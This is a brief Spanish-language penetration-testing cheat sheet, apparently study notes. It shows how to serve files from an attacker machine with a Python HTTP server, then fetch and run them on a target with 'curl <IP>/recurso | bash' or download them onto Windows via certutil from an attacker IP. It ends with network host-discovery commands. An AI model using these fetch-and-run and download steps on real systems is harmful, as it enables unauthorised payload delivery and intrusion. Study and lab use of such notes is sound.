
----

----

- Servidor Web python
```python
//Maquina alojando recurso
python3 -m http.server 80
```


- Descargar recurso y "Ejecutarlo"
```bash
//maquina que realiza peticion
curl <IP>/recurso | bash
```

## Compartir archivos WINDOWS
- 
```python3
//maquina atacante kali
python3 -m http.server 80
```


```cmd
//Maquina windows
certutil -split -urlcache -f http://<IpAtacante>/archivo
```



### Ver hosts activos dentro de la red

- ARP-SCAN
```bash
sudo arp-scan --localnet -I eth0
```

- NETDISCOVER
```bash
sudo netdiscover -i eth0 -r 192.168.3.0/24
```

- NMAP
```bash
nmap -sn 192.168.3.0/24 
```

- **IMPORTANTE**, probar todas las herramientas y comparar resultados
- Una vez teniendo los hosts activos, podemos validar con ping, dependiendo del **TTL** cuales son Windows y Linux